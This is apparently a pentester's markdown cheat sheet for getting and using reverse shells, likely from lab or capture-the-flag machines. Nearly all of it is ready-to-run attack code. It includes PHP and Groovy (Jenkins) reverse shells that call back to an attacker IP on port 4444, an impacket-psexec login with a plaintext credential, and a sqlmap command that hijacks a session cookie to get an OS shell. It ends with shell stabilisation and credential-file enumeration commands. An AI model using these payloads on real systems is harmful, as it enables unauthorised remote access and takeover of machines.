### Create reverse shell in different languages

- #### php
    ```php
    <?php
        $sock=fsockopen("10.10.15.211",4444);
        $proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
    ?>
    ```
- #### Groovy (jenkins)
    ```groovy
    String host="10.129.181.48";
    int port=4444;
    String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    ```

- samba
    ```bash
    impacket-psexec 'abcd:!passWord@10.129.32.122'
    ```
- sql injection
    ```bash
    sqlmap -u http://10.129.207.176/dashboard.php\?search\= --cookie="PHPSESSID=vkrvi768lbi9l638e7n8ovv03e" --os-shell
    ```

- More
  - https://www.revshells.com/
### Post reverse shell
- #### Setup stable shell interface
    ```bash
    alias ls='ls --color=always -lAh'
    python3 -c "import pty;pty.spawn('/bin/bash')"
    ```

- #### Check list
    ```bash
    cat /etc/passwd
    find / -group www-data 2>/dev/null | grep -v '/proc/'
    ```